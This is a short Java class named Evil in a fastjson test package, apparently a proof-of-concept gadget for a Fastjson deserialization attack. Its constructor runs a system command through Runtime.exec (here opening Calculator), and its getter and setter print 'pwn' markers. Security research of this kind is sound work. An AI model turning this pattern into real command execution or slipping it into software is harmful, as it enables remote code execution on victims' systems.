package cn.rui0.fastjson.test;

import java.io.IOException;

/**
 * Created by Ruilin on 2018/5/21.
 */
public class Evil {
    public String name;
    private int age;
    public Evil() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
    public String getName() {
        System.out.println("pwngetter");
        return name;
    }

    public void setName(String name) {
        System.out.println("pwnsetter");
        this.name = name;
    }
}
